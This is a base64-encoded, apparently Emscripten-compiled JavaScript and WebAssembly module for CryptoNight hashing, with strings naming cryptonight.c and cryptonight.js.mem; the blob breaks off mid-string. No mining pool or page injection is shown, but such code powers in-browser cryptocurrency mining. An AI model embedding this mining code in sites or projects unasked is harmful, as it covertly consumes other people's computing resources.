Vkxmalh1TnBIdFMzWjlDUGtLaFB0MWV6Wk54azd4eFhoT3hvcGVpSnBjVHBxSUU5UVJYOWFhNUFiaG91R2xvdVFCQnFESUxwUXpCdFhRc2RKa3N3VURnb0dDZ2dHQkE0OEloSHlIZEgrTjVPa1BJUS9MSWViYWFMTzBzZCsyMjFBM1p2dG16dnRTTlI4cEd5Z0ZHaldjWGNObHd6dGxuY3EvZFM5M2tTM0tVN1huZWVUUGVsSmovWjlSbks5U1lzSk1qNkNONzZMQ0ZXOTVLM2hGS2hic0d2V3U5Yld1N3hidCtLbjZSS3NWUGV6VGxOSjdsVCszWE9oWTZ3UmJ0aHRKVXhWUVh4WWFhK0dMWFlpL1htbWFaLzFYL3pGVm1FYmFubEtjaWxCR0t3RXJQU2cvUGl1blpNQkF3eVJEcEJBNEtCZ29JQmdUK1pwaUJtT2VCL3FDckMvQUxXL0NnZUxUTVJNendSSGdsOE5XNjFVcTZKVXQxUHVNK2x1TkxvcXdPOHc1Zjg2SmRSQm4rR2JyK1hZRGJXOEJiRzhDQUJZQ0Zpb1VLaWdVLzAreXQ3SDZ0UHlIKzM3emZRcndoY0tqWVNOamdTSER4L1F3RURQa0U4V01aZXQ5Nnh0OWpkeTlZd1ZqdXdYZXZNSjkxbjBWMXIwTG5wV09saEdOQ0lIQlFNRkJBTUNEbHl5NGFMdEVhNWYzdkVnNFM0UTc5dndpM2JiZGxiYitCVmRSTTFCbE1nUmdrUEJROE1CUVlKbmxmTlY5TU5TYkRzbkV2Y1owdnc3NkdPT0U0WitHK05jajlvdjFxb2pXSXgwL01Ud3ZNaUM1bFN6bExYRGt1azJyNVYvazlWNU5WV0EzeURhcnlWZnhobllLZDQ0TDhlclBKUjhuMFIzcklKKytzNzR1c3lMcUlNdWN5YitlNk1rOTlLMzFrS3pMbVFxU1ZwTmVWNXNBNys2RDdtNkRBR2Fxem1MTXltQm1lOW1qUmFDZlJucU1pZ1grQlhYK2pSTzZxWnFxSVprUlUxb0orZ3FoK1ZEdmQ1cXZtZHFzN0M1V2VnNTRXZ3d1TXlVWEtSUVBLak1lOGV5bDdsU25IYXdWdTAyN1cwMnNvYkVROFJGQThLS2NzaTNtTFZYbW52SUU5NGoxajRyd1dNU2NkSnl3ZEZxMDNtbmFhUVhhdDI1Wk5PMDJ0Tzl0a252cFcrc2hXWkhTbTBrN1M2RTUwRkRZaUhpSW9IaFNTNUhiYmRqL2JrZ3dTSGdvZUdBb01TUHkwYkxTUWJFaTRqemZrTjJ2a3VKOTQ1MTNuSlYyZnZRK3lickpoYnIxRGFTcnZLb2J2UThRMThhYnhrNmJFT2RyanFPTnlxRGt4eHZlazkyS2tNZE9LV1RkWnZUZlQ4blNHaTRiL2kvTFZnMVl5VnJFeTFZdE94VVBGRFVPTGJvWHJXZXZjV1c3YUdNSzN3cSszMmdHT2o0eVBBb3dCc1Iyc1pLeDVaTEdjOFczU2JTUFNuRWx5TytBN2t1QkoyQi9IdE1lcnROaXN1Ulg2RlVQNnJQUDZDUWNKL1Fmeno2QnZKVytGSmMvS0lPcXY2byt2eXZSOWlZNko4NDcwUjJjZzZTQ082VWNRT0NnWUtDQVlFRzhMWk5WazN0VnY4SE9EaUlQN2lQQksrN0Z2c1pSdlNsektsbktXdUhKY09GUnNKR3h3SkRoWFh3anhDSzd4VjNNaFVzZFM1c2R6bDJUelVmTTFVWmZMcm1ValpZMGp5NkVsaEh5RVdYeWg2RmUvbkwvTG5PZytYV01oWTN3aFBwYnFmTjE4TjkyV1lSNS8zSC9DM0dFTm5KR0drUnFHRFErYmxJV1VIb1VQNEV1cmtLdmJrT0I4dXNaQ3h2aENmSEVtVjhSWDRzUnh6Q25scXVXRHFzeVE0M1BZY3p2WWtBWUpEd1VQREFVRzkvUURBUVAxQWZjY0tqWVNOamdTSE1JOC9xUCtuNlBDYW92aFgrSFVYMnF1dmhENUVFZjVybWtDYTlCcjB0QnBGNytva2FndWtSZVpjZWhZNkNsWW1UcFRhU2RwZENjNkovZlF1ZEJPdVNmWmtVZzRTS2s0MmV2ZU5STTF6UlBySytYT3M4NVdzeXNpZDFVelZVUXpJdElFMXJ2V3Y3dlNxVG1RY0pCSmNLa0hoNENKZ0E2SkJ6UEI4cWZ5WnFjekxlekJ0c0ZhdGkwOFdtWWlabmdpUEJXNHJaS3RLcElWeWFsZ0lHQ0pJTW1IWE50SjJ4VkpoNnF3R3Y4YVQvK3FVTmlJZUlpZ2VGQ2xLNDU2amxGNnBRT0ppbytLQm84RFdVb1QrQk95K0ZrSmtwdUFteEtBQ1Jvak9SYzVOQmNhWlJCMTJuWEsybVhYaEZNeFU3VXgxNFRWVWNaUkU4YUUwQVBUdU5PN3VOQ0MzRjdEWGgvRGdpbml5N0RMVXJBcFdzT1pkNW0wZDFvZUxUTVJNendSSG5zOVJzdEc5c3Q3cUxjZi9COUwvS2h0REdIV1lkcldiU3hpVGpwT1dEb3NBUUFBQUFNQUFBQUdBQUFBQ2dBQUFBOEFBQUFWQUFBQUhBQUFBQ1FBQUFBdEFBQUFOd0FBQUFJQUFBQU9BQUFBR3dBQUFDa0FBQUE0QUFBQUNBQUFBQmtBQUFBckFBQUFQZ0FBQUJJQUFBQW5BQUFBUFFBQUFCUUFBQUFzQUFBQUNnQUFBQWNBQUFBTEFBQUFFUUFBQUJJQUFBQURBQUFBQlFBQUFCQUFBQUFJQUFBQUZRQUFBQmdBQUFBRUFBQUFEd0FBQUJjQUFBQVRBQUFBRFFBQUFBd0FBQUFDQUFBQUZBQUFBQTRBQUFBV0FBQUFDUUFBQUFZQUFBQUJBRUdNd0FBTEFyQXNBRUhFd0FBTEFRVUFRZERBQUFzQkFRQkI2TUFBQ3c0QkFBQUFBZ0FBQU53c0FBQUFCQUJCZ01FQUN3RUJBRUdQd1FBTEJRci8vLy8vQUVIQXdRQUx3QUpFSUFBQUtGTlZRME5GVTFNZ1BUMGdjaWtBYkdsaUwyTnllWEIwYjI1cFoyaDBMMk55ZVhCMGIyNXBaMmgwTG1NQVpHOWZhbWhmYUdGemFBQW9VMHRGU1U1ZlUxVkRRMFZUVXlBOVBTQnlLUUJrYjE5emEyVnBibDlvWVhOb0FBQUJBZ01FQlFZSENBa0tDd3dORGc4T0NnUUlDUThOQmdFTUFBSUxCd1VEQ3dnTUFBVUNEdzBLRGdNR0J3RUpCQWNKQXdFTkRBc09BZ1lGQ2dRQUR3Z0pBQVVIQWdRS0R3NEJDd3dHQ0FNTkFnd0dDZ0FMQ0FNRURRY0ZEdzRCQ1F3RkFROE9EUVFLQUFjR0F3a0NDQXNOQ3djT0RBRURDUVVBRHdRSUJnSUtCZzhPQ1FzREFBZ01BZzBIQVFRS0JRb0NDQVFIQmdFRkR3c0pEZ01NRFFBQUFRSURCQVVHQndnSkNnc01EUTRQRGdvRUNBa1BEUVlCREFBQ0N3Y0ZBd3NJREFBRkFnOE5DZzREQmdjQkNRUUhDUU1CRFF3TERnSUdCUW9FQUE4SWdBQkJ2OFFBQzhvUUxmN2RZdm1hbUt5dWZLeldHZFkwNTZTREVBVzhNQklXdUdBNHhzbG1GSlJtMlltZkpZQndiODZlb3hzZG14cmNFZWd5WDNzMmJoRDVsSVYvQXZvR3dSdFBHMXpZeUVDemwvYWhmMjV6Z0puYzM1T2xyZXFqMDZReDZON0pVNXBvSXJTcGl1eUdvZVRWZEt5Vm5PVnM4QldXRGVxMXF5dS9saEhjOE4xazZtN3JtS05CTENEVDY1TE52bnVjc2tYQkhKTlJrV0RVeC9vbUFJTFdmbENLQTZRam5pWjNKcmxGNFBzYVNOUWFsSGZOdGFzbUFtc1hlbGJ3SkVJUC95K29jYU9XaVg4dVRYVWRGRWtJOTMzaVlpZDJsZmQySkkrVWg5VzJWMGVBS1d4Y1hpY3RySTROYkZHRVVNWlhCWG9QZStUVFozQWtFdXFKNDZzVDB4elhhVWdlTzhiWUV6bUtiVHRlaVVyZWg1dGordXBvMUlDdExqTXN5eUZJRDRKbm1LN0lUWkNDdVNqVVZlb3dRUkZDU1RiMVZiS1NTRWZzeHlVS2s3cjBQT0ZXbTMrS0o5dEZUSjc4dlVsamw2OE9XSi9DZlNhcWdNMkF3SXVNbmVzdTJvcDVnZWo0MVRjNjlEbG5yZDNSZW5HcHROTzlwSFhUbEpkc1A3cVlRbk4vYjlGTGxqNEFxaGRqYWk0RmVoWFZRNG9pWG8wTWwrOEw2VFFTV2ZLencyR0pIYURCVTIrQUhpcXBCV3ZxSzIyQVdJN00yeUIxdXFhcER6cDJ1dmc3OXdGcDVnVkI0MHBwUnJXS2ppNXY1bG9RUjZmUXdZUThKRHR1Y2JFdFdzR1p6MWYyN0oyeCtGYW5Cb2g4VnhheFZ1UEMvTi9taFJmN1ZGcEdlTXlNM1V0eTFkNmkzeFg0WjN1RUZRcTNJeFZYZ2F2V2tFMWFoL1pPbjAvRnc5RXJRT3FZT3VCY1JmcWNBOFhTbVdheW1acG1BcGEwOHJ0VGlyVldGQnFJMjZJeEE2TmFYSm9aRHR0QVA3SUtoOEZFRUJ3RkdZQ0VucFVkYnpQcnJWN256ZHdRdWhPU0FyOXJRZHg0WlJYM3V5ZlFDaXlCT1RlcWVGQS9Hci9TUVFDUjAwSXRXZzMyekg2UTNXS2ZuSkxBbDg0WVhLY0x4eXRFck5IZlpkWmp4dndqbDI1c0E1N2d1Qm9oQlVWK1JHenNxTzd4QTd0ZGptSDYvWmFYc3BTRGdaZEtqb1UzMndNd0x5cG5qUzM3bjJxVml2NXpnZmk0YVd5S3gzSkd3SDlDRk1YMEZZKzl4MTdFZFVSdnA0OFJ1NEJTM25XM3J1U0l2SUs0QUI2WXBxUDBqdlNQTTZtall4V3FYMVlrMWJmNWliYng3U0I4V3VEOU5zcnBXZ1pDTERiT0tUVkRUdjZZUFZNNitYUnpta3VuMFBVZldXOU9nWVlPbmEyQnI5aGFuNmNGQm1mdU5HSnFpd3Nvdm02NUZ5ZEhkQWNteG9BUVArQ2dmbS9HZmtoN0RWVUtwVXI0cE1DUjQrZWZsNDd4bm9aMmNvRlFZSTNVZnA1YVFmUGxzR0w4bngvc1FGUWdldVBrR2dETzlNbUVUOWVVOVozNmxkaFZMbjRSSk1OVXBWdmZjaWk5L200b2VQVi80ZytseExJRmlYenY3a25UTGtSK2s0WHJLRmwvY0Y5cE43TWtNVXBlaGlqeEhkYmtaY2NiZHdSUnVTRG5kUDVENkNQVWg0cDlLZWlqa25hVTh0M0xlZ21iTU5uQkhSc3crMXZjRytEYUpFbFA4cHlDdjZUbnVqRzBjTC8vRFRKRUJkNzR2RWc3cnZ3eVU3dlRPVVdmdzhIZ0tZdWc1Y2tGL2ZldUNRK1VjRFFTUXBEeE5LSnh0d0hqUk8yVjZUdU9Oazh2bUVxSVFCMWpvR3oyRlVmQlJFdUhVcS8vZnJ0SzhlSUt4akJHY0xiRnpHNk01cVRWcEZhOVQ4b0EycDJFUzhnK0dLNXpWODVGTUdUUnJlaW16bWdVWENWbm85cU04c3NPNFJZejZRWlltcFNabWg5Z3NpRENiNFI3MGM2c2Y2RFJoUmd5V1Z1aGpkMFowMUNhSE1DcXBiUkduejFqWitRRWE3cjJ5aG1yQzFidWZoK3hlZXFwS0NGMDZiMzNOVHMyVWU0ZFY2eGFkVkRUZGpwR3d2NmpmWEFCOXpYQnI1aWsyRUo0N2V3Z25tdG5lVUdEWXhYcU90dW8rc003VFRLRExJT25RRHNmSENkSDgxbEE4RFMzTFhhYTV6NU9iTkloVC8yNC9ZMDUzRmRaNzQyYkRFa3JTZXZhVzZMWFNXanpjQTE5TzY3UWVvMVZoUFdsNmZEaytJNWxvTGlpOURZUU8xTU1xQWVlZFQ3c1dwRm9sSkpXNkloUFc3QmNWZmk2dkV6anV6dVo4NGVVZTNYYTlOWnlheHhkWks2c0tOdzBzMjFzTktWUXVDamJjZmhoNHZJUWpWRXE0OXRrTTFuZGRmd2NyTHp4UTg0L29tZTcwVHdDNkVPd013cGJ5b2dwb1hWL05CbE50QlpUWEpJN2xNTU9lVTBlZVhSMTE3YnVyei9xcU5UM3ZobzVJVnowZmdsTUl5ZFJKcU1rVTdveVBOSkVveGRLYmFiVnJiVWRQcWF2OHNrSWcxazltSkZyUEZaTStIeWhjb1pnVFViaVBzd0lic2YyTDVnenM3RzhkbDRyMW1hbDc4VG1LZ2IwdHVpK3dkUTJkTzZDRmJ6dklXUDl3VTROOUZQSmFhZDlXc1FHV0ZnbWZzRVVGZ2JnK2haK2tLODlLR09kUDlMSjh1TUFtOUlNWDZyT01MZlVEREIwS2xFVzh1QXltQTNyTU5qanp2aWFTOFdlZTdYeGVaTC9VZVp1QklabzA1c2pUVmZtbG1jeHpPYW04eGNLZFFXeGRvSFpFekpzemp3WFVvVDRCYUppOUN2THMzaEhGVWYvUmxTQ0k1TnFTRGpmV0FkT1htVmw4dng4aWZ5R1VJNHhjQzVFMEF2S2h2QkFDYUl3ZUVkT1phRHVPZEgzT0lQM1h1azM1Q3c2dlNHWHNpWUJFL2h2bzBUdDBlK2YzdWVMb044VmRpV1MyVHlGOS9ZUzNFSysyS2ZzZktzbnNINVRqWDNhcWo2bzNxb2x6cE85QW1uWVd2WkQvUnB6Q1BuQVgrL2FGMG9acFpkTlpqTk0vU0ZxTmJTWU1kdEJGWERxSGcrNzdjMVVtNXJRWTZGUmwwQnk5bldkdjVGSGIrSmpmSGQ3OG10dnhUQUJaeXYrMTZ0MnlvTEpmZnBaUi9DdDFLS3ZuS1J5d0xmOWt5WTJQL2ZNTktYbDhYSFlNUlVFeHlQREdKWUZtZ2NTZ09Mcko3SjFDWU1zR2h0dVdxQlNPOWF6S2VNdmhGUFJBTzBnL0xGYmFzdStPVXBNV00vUTc2cjdRMDB6aFVYNUFuOVFQSitvVWFOQWo1S2RPUFc4dHRvaEVQL3owczBNRSt4ZmwwUVh4S2QrUFdSZEdYTmdnVS9jSWlxUWlFYnV1QlRlWGd2YjRESTZDa2tHSkZ6QzA2eGlrWlhrZWVmSU4yMk4xVTZwYkZiMDZtVjZyZ2k2ZUNVdUhLYTB4dWpkZEI5THZZdUtjRDYxWmtnRDlnNWhOVmU1aHNFZG51SDRtQkZwMlk2VW14Nkg2YzVWS04rTW9Za052K1pDYUVHWkxRK3dWTHNXQVFJRUNCQWdRSUFiTmciO3JldHVybiBVaW50OEFycmF5LmZyb20oYXRvYihyYXcpLGM9PmMuY2hhckNvZGVBdCgwKSl9CnJldHVybiBuZXcgUHJvbWlzZSgoZnVuY3Rpb24ocmVzb2x2ZSxyZWplY3Qpe3Jlc29sdmUoZ2V0QmluYXJ5KCkpfSkpfQpmdW5jdGlvbiBkb05hdGl2ZVdhc20oZ2xvYmFsLGVudixwcm92aWRlZEJ1ZmZlcil7aWYodHlwZW9mIFdlYkFzc2VtYmx5IT09Im9iamVjdCIpe01vZHVsZS5wcmludEVycigibm8gbmF0aXZlIHdhc20gc3VwcG9ydCBkZXRlY3RlZCIpO3JldHVybiExfQppZighKE1vZHVsZS53YXNtTWVtb3J5IGluc3RhbmNlb2YgV2ViQXNzZW1ibHkuTWVtb3J5KSl7TW9kdWxlLnByaW50RXJyKCJubyBuYXRpdmUgd2FzbSBNZW1vcnkgaW4gdXNlIik7cmV0dXJuITF9CmVudi5tZW1vcnk9TW9kdWxlLndhc21NZW1vcnk7aW5mby5nbG9iYWw9eyJOYU4iOk5hTiwiSW5maW5pdHkiOkluZmluaXR5fTtpbmZvWyJnbG9iYWwuTWF0aCJdPWdsb2JhbC5NYXRoO2luZm8uZW52PWVudjtmdW5jdGlvbiByZWNlaXZlSW5zdGFuY2UoaW5zdGFuY2Upe2V4cG9ydHM9aW5zdGFuY2UuZXhwb3J0cztpZihleHBvcnRzLm1lbW9yeSltZXJnZU1lbW9yeShleHBvcnRzLm1lbW9yeSk7TW9kdWxlLmFzbT1leHBvcnRzO01vZHVsZS51c2luZ1dhc209ITA7cmVtb3ZlUnVuRGVwZW5kZW5jeSgid2FzbS1pbnN0YW50aWF0ZSIpfQphZGRSdW5EZXBlbmRlbmN5KCJ3YXNtLWluc3RhbnRpYXRlIik7aWYoTW9kdWxlLmluc3RhbnRpYXRlV2FzbSl7dHJ5e3JldHVybiBNb2R1bGUuaW5zdGFudGlhdGVXYXNtKGluZm8scmVjZWl2ZUluc3RhbmNlKX1jYXRjaChlKXtNb2R1bGUucHJpbnRFcnIoIk1vZHVsZS5pbnN0YW50aWF0ZVdhc20gY2FsbGJhY2sgZmFpbGVkIHdpdGggZXJyb3I6ICIrZSk7cmV0dXJuITF9fQpXZWJBc3NlbWJseS5pbnN0YW50aWF0ZShnZXRCaW5hcnlQcm9taXNlKCksaW5mbykudGhlbigoZnVuY3Rpb24ob3V0cHV0KXtyZWNlaXZlSW5zdGFuY2Uob3V0cHV0Lmluc3RhbmNlKX0pKTtyZXR1cm57fX0KTW9kdWxlLmFzbVByZWxvYWQ9TW9kdWxlLmFzbTt2YXIgYXNtanNSZWFsbG9jQnVmZmVyPU1vZHVsZS5yZWFsbG9jQnVmZmVyO3ZhciB3YXNtUmVhbGxvY0J1ZmZlcj0oZnVuY3Rpb24oc2l6ZSl7dmFyIFBBR0VfTVVMVElQTEU9TW9kdWxlLnVzaW5nV2FzbT9XQVNNX1BBR0VfU0laRTpBU01KU19QQUdFX1NJWkU7c2l6ZT1hbGlnblVwKHNpemUsUEFHRV9NVUxUSVBMRSk7dmFyIG9sZD1Nb2R1bGUuYnVmZmVyO3ZhciBvbGRTaXplPW9sZC5ieXRlTGVuZ3RoO2lmKE1vZHVsZS51c2luZ1dhc20pe3RyeXt2YXIgcmVzdWx0PU1vZHVsZS53YXNtTWVtb3J5Lmdyb3coKHNpemUtb2xkU2l6ZSkvd2FzbVBhZ2VTaXplKTtpZihyZXN1bHQhPT0oLTF8MCkpe3JldHVybiBNb2R1bGUuYnVmZmVyPU1vZHVsZS53YXNtTWVtb3J5LmJ1ZmZlcn1lbHNle3JldHVybiBudWxsfX1jYXRjaChlKXtyZXR1cm4gbnVsbH19ZWxzZXtleHBvcnRzLl9fZ3Jvd1dhc21NZW1vcnkoKHNpemUtb2xkU2l6ZSkvd2FzbVBhZ2VTaXplKTtyZXR1cm4gTW9kdWxlLmJ1ZmZlciE9PW9sZD9Nb2R1bGUuYnVmZmVyOm51bGx9fSk7TW9kdWxlLnJlYWxsb2NCdWZmZXI9KGZ1bmN0aW9uKHNpemUpe2lmKGZpbmFsTWV0aG9kPT09ImFzbWpzIil7cmV0dXJuIGFzbWpzUmVhbGxvY0J1ZmZlcihzaXplKX1lbHNle3JldHVybiB3YXNtUmVhbGxvY0J1ZmZlcihzaXplKX19KTt2YXIgZmluYWxNZXRob2Q9IiI7TW9kdWxlLmFzbT0oZnVuY3Rpb24oZ2xvYmFsLGVudixwcm92aWRlZEJ1ZmZlcil7Z2xvYmFsPWZpeEltcG9ydHMoZ2xvYmFsKTtlbnY9Zml4SW1wb3J0cyhlbnYpO2lmKCFlbnYudGFibGUpe3ZhciBUQUJMRV9TSVpFPU1vZHVsZS53YXNtVGFibGVTaXplO2lmKFRBQkxFX1NJWkU9PT11bmRlZmluZWQpVEFCTEVfU0laRT0xMDI0O3ZhciBNQVhfVEFCTEVfU0laRT1Nb2R1bGUud2FzbU1heFRhYmxlU2l6ZTtpZih0eXBlb2YgV2ViQXNzZW1ibHk9PT0ib2JqZWN0IiYmdHlwZW9mIFdlYkFzc2VtYmx5LlRhYmxlPT09ImZ1bmN0aW9uIil7aWYoTUFYX1RBQkxFX1NJWkUhPT11bmRlZmluZWQpe2Vudi50YWJsZT1uZXcgV2ViQXNzZW1ibHkuVGFibGUoeyJpbml0aWFsIjpUQUJMRV9TSVpFLCJtYXhpbXVtIjpNQVhfVEFCTEVfU0laRSwiZWxlbWVudCI6ImFueWZ1bmMifSl9ZWxzZXtlbnYudGFibGU9bmV3IFdlYkFzc2VtYmx5LlRhYmxlKHsiaW5pdGlhbCI6VEFCTEVfU0laRSxlbGVtZW50OiJhbnlmdW5jIn0pfX1lbHNle2Vudi50YWJsZT1uZXcgQXJyYXkoVEFCTEVfU0laRSl9Ck1vZHVsZS53YXNtVGFibGU9ZW52LnRhYmxlfQppZighZW52Lm1lbW9yeUJhc2Upe2Vudi5tZW1vcnlCYXNlPU1vZHVsZS5TVEFUSUNfQkFTRX0KaWYoIWVudi50YWJsZUJhc2Upe2Vudi50YWJsZUJhc2U9MH0KdmFyIGV4cG9ydHM7ZXhwb3J0cz1kb05hdGl2ZVdhc20oZ2xvYmFsLGVudixwcm92aWRlZEJ1ZmZlcik7cmV0dXJuIGV4cG9ydHN9KTt2YXIgbWV0aG9kSGFuZGxlcj1Nb2R1bGUuYXNtfQppbnRlZ3JhdGVXYXNtSlMoTW9kdWxlKTt2YXIgQVNNX0NPTlNUUz1bXTtTVEFUSUNfQkFTRT1SdW50aW1lLkdMT0JBTF9CQVNFO1NUQVRJQ1RPUD1TVEFUSUNfQkFTRSsxMjUxMjtfX0FUSU5JVF9fLnB1c2goKTttZW1vcnlJbml0aWFsaXplcj1Nb2R1bGUud2FzbUpTTWV0aG9kLmluZGV4T2YoImFzbWpzIik+PTB8fE1vZHVsZS53YXNtSlNNZXRob2QuaW5kZXhPZigiaW50ZXJwcmV0LWFzbTJ3YXNtIik+PTA/ImNyeXB0b25pZ2h0LmpzLm1lbSI6bnVsbDt2YXIgU1RBVElDX0JVTVA9MTI1MTI7TW9kdWxlLlNUQVRJQ19CQVNFPVNUQVRJQ19CQVNFO01vZHVsZS5TVEFUSUNfQlVNUD1TVEFUSUNfQlVNUDt2YXIgdGVtcERvdWJsZVB0cj1TVEFUSUNUT1A7U1RBVElDVE9QKz0xNjtmdW5jdGlvbiBfX19hc3NlcnRfZmFpbChjb25kaXRpb24sZmlsZW5hbWUsbGluZSxmdW5jKXtBQk9SVD0hMDt0aHJvdyAiQXNzZXJ0aW9uIGZhaWxlZDogIitQb2ludGVyX3N0cmluZ2lmeShjb25kaXRpb24pKyIsIGF0OiAiK1tmaWxlbmFtZT9Qb2ludGVyX3N0cmluZ2lmeShmaWxlbmFtZSk6InVua25vd24gZmlsZW5hbWUiLGxpbmUsZnVuYz9Qb2ludGVyX3N0cmluZ2lmeShmdW5jKToidW5rbm93biBmdW5jdGlvbiJdKyIgYXQgIitzdGFja1RyYWNlKCl9CnZhciBQUk9DSU5GTz17cHBpZDoxLHBpZDo0MixzaWQ6NDIscGdpZDo0Mn07dmFyIEVSUk5PX0NPREVTPXtFUEVSTToxLEVOT0VOVDoyLEVTUkNIOjMsRUlOVFI6NCxFSU86NSxFTlhJTzo2LEUyQklHOjcsRU5PRVhFQzo4LEVCQURGOjksRUNISUxEOjEwLEVBR0FJTjoxMSxFV09VTERCTE9DSzoxMSxFTk9NRU06MTIsRUFDQ0VTOjEzLEVGQVVMVDoxNCxFTk9UQkxLOjE1LEVCVVNZOjE2LEVFWElTVDoxNyxFWERFVjoxOCxFTk9ERVY6MTksRU5PVERJUjoyMCxFSVNESVI6MjEsRUlOVkFMOjIyLEVORklMRToyMyxFTUZJTEU6MjQsRU5PVFRZOjI1LEVUWFRCU1k6MjYsRUZCSUc6MjcsRU5PU1BDOjI4LEVTUElQRToyOSxFUk9GUzozMCxFTUxJTks6MzEsRVBJUEU6MzIsRURPTTozMyxFUkFOR0U6MzQsRU5PTVNHOjQyLEVJRFJNOjQzLEVDSFJORzo0NCxFTDJOU1lOQzo0NSxFTDNITFQ6NDYsRUwzUlNUOjQ3LEVMTlJORzo0OCxFVU5BVENIOjQ5LEVOT0NTSTo1MCxFTDJITFQ6NTEsRURFQURMSzozNSxFTk9MQ0s6MzcsRUJBREU6NTIsRUJBRFI6NTMsRVhGVUxMOjU0LEVOT0FOTzo1NSxFQkFEUlFDOjU2LEVCQURTTFQ6NTcsRURFQURMT0NLOjM1LEVCRk9OVDo1OSxFTk9TVFI6NjAsRU5PREFUQTo2MSxFVElNRTo2MixFTk9TUjo2MyxFTk9ORVQ6NjQsRU5PUEtHOjY1LEVSRU1PVEU6NjYsRU5PTElOSzo2NyxFQURWOjY4LEVTUk1OVDo2OSxFQ09NTTo3MCxFUFJPVE86NzEsRU1VTFRJSE9QOjcyLEVET1RET1Q6NzMsRUJBRE1TRzo3NCxFTk9UVU5JUTo3NixFQkFERkQ6NzcsRVJFTUNIRzo3OCxFTElCQUNDOjc5LEVMSUJCQUQ6ODAsRUxJQlNDTjo4MSxFTElCTUFYOjgyLEVMSUJFWEVDOjgzLEVOT1NZUzozOCxFTk9URU1QVFk6MzksRU5BTUVUT09MT05HOjM2LEVMT09QOjQwLEVPUE5PVFNVUFA6OTUsRVBGTk9TVVBQT1JUOjk2LEVDT05OUkVTRVQ6MTA0LEVOT0JVRlM6MTA1LEVBRk5PU1VQUE9SVDo5NyxFUFJPVE9UWVBFOjkxLEVOT1RTT0NLOjg4LEVOT1BST1RPT1BUOjkyLEVTSFVURE9XTjoxMDgsRUNPTk5SRUZVU0VEOjExMSxFQUREUklOVVNFOjk4LEVDT05OQUJPUlRFRDoxMDMsRU5FVFVOUkVBQ0g6MTAxLEVORVRET1dOOjEwMCxFVElNRURPVVQ6MTEwLEVIT1NURE9XTjoxMTIsRUhPU1RVTlJFQUNIOjExMyxFSU5QUk9HUkVTUzoxMTUsRUFMUkVBRFk6MTE0LEVERVNUQUREUlJFUTo4OSxFTVNHU0laRTo5MCxFUFJPVE9OT1NVUFBPUlQ6OTMsRVNPQ0tUTk9TVVBQT1JUOjk0LEVBRERSTk9UQVZBSUw6OTksRU5FVFJFU0VUOjEwMixFSVNDT05OOjEwNixFTk9UQ09OTjoxMDcsRVRPT01BTllSRUZTOjEwOSxFVVNFUlM6ODcsRURRVU9UOjEyMixFU1RBTEU6MTE2LEVOT1RTVVA6OTUsRU5PTUVESVVNOjEyMyxFSUxTRVE6ODQsRU9WRVJGTE9XOjc1LEVDQU5DRUxFRDoxMjUsRU5PVFJFQ09WRVJBQkxFOjEzMSxFT1dORVJERUFEOjEzMCxFU1RSUElQRTo4Nn07dmFyIEVSUk5PX01FU1NBR0VTPXswOiJTdWNjZXNzIiwxOiJOb3Qgc3VwZXItdXNlciIsMjoiTm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeSIsMzoiTm8gc3VjaCBwcm9jZXNzIiw0OiJJbnRlcnJ1cHRlZCBzeXN0ZW0gY2FsbCIsNToiSS9PIGVycm9yIiw2OiJObyBzdWNoIGRldmljZSBvciBhZGRyZXNzIiw3OiJBcmcgbGlzdCB0b28gbG9uZyIsODoiRXhlYyBmb3JtYXQgZXJyb3IiLDk6IkJhZCBmaWxlIG51bWJlciIsMTA6Ik5vIGNoaWxkcmVuIiwxMToiTm8gbW9yZSBwcm9jZXNzZXMiLDEyOiJOb3QgZW5vdWdoIGNvcmUiLDEzOiJQZXJtaXNzaW9uIGRlbmllZCIsMTQ6IkJhZCBhZGRyZXNzIiwxNToiQmxvY2sgZGV2aWNlIHJlcXVpcmVkIiwxNjoiTW91bnQgZGV2aWNlIGJ1c3kiLDE3OiJGaWxlIGV4aXN0cyIsMTg6IkNyb3NzLWRldmljZSBsaW5rIiwxOToiTm8gc3VjaCBkZXZpY2UiLDIwOiJOb3QgYSBkaXJlY3RvcnkiLDIxOiJJcyBhIGRpcmVjdG9yeSIsMjI6IkludmFsaWQgYXJndW1lbnQiLDIzOiJUb28gbWFueSBvcGVuIGZpbGVzIGluIHN5c3RlbSIsMjQ6IlRvbyBtYW55IG9wZW4gZmlsZXMiLDI1OiJOb3QgYSB0eXBld3JpdGVyIiwyNjoiVGV4dCBmaWxlIGJ1c3kiLDI3OiJGaWxlIHRvbyBsYXJnZSIsMjg6Ik5vIHNwYWNlIGxlZnQgb24gZGV2aWNlIiwyOToiSWxsZWdhbCBzZWVrIiwzMDoiUmVhZCBvbmx5IGZpbGUgc3lzdGVtIiwzMToiVG9vIG1hbnkgbGlua3MiLDMyOiJCcm9rZW4gcGlwZSIsMzM6Ik1hdGggYXJnIG91dCBvZiBkb21haW4gb2YgZnVuYyIsMzQ6Ik1hdGggcmVzdWx0IG5vdCByZXByZXNlbnRhYmxlIiwzNToiRmlsZSBsb2NraW5nIGRlYWRsb2NrIGVycm9yIiwzNjoiRmlsZSBvciBwYXRoIG5hbWUgdG9vIGxvbmciLDM3OiJObyByZWNvcmQgbG9ja3MgYXZhaWxhYmxlIiwzODoiRnVuY3Rpb24gbm90IGltcGxlbWVudGVkIiwzOToiRGlyZWN0b3J5IG5vdCBlbXB0eSIsNDA6IlRvbyBtYW55IHN5bWJvbGljIGxpbmtzIiw0MjoiTm8gbWVzc2FnZSBvZiBkZXNpcmVkIHR5cGUiLDQzOiJJZGVudGlmaWVyIHJlbW92ZWQiLDQ0OiJDaGFubmVsIG51bWJlciBvdXQgb2YgcmFuZ2UiLDQ1OiJMZXZlbCAyIG5vdCBzeW5jaHJvbml6ZWQiLDQ2OiJMZXZlbCAzIGhhbHRlZCIsNDc6IkxldmVsIDMgcmVzZXQiLDQ4OiJMaW5rIG51bWJlciBvdXQgb2YgcmFuZ2UiLDQ5OiJQcm90b2NvbCBkcml2ZXIgbm90IGF0dGFjaGVkIiw1MDoiTm8gQ1NJIHN0cnVjdHVyZSBhdmFpbGFibGUiLDUxOiJMZXZlbCAyIGhhbHRlZCIsNTI6IkludmFsaWQgZXhjaGFuZ2UiLDUzOiJJbnZhbGlkIHJlcXVlc3QgZGVzY3JpcHRvciIsNTQ6IkV4Y2hhbmdlIGZ1bGwiLDU1OiJObyBhbm9kZSIsNTY6IkludmFsaWQgcmVxdWVzdCBjb2RlIiw1NzoiSW52YWxpZCBzbG90Iiw1OToiQmFkIGZvbnQgZmlsZSBmbXQiLDYwOiJEZXZpY2Ugbm90IGEgc3RyZWFtIiw2MToiTm8gZGF0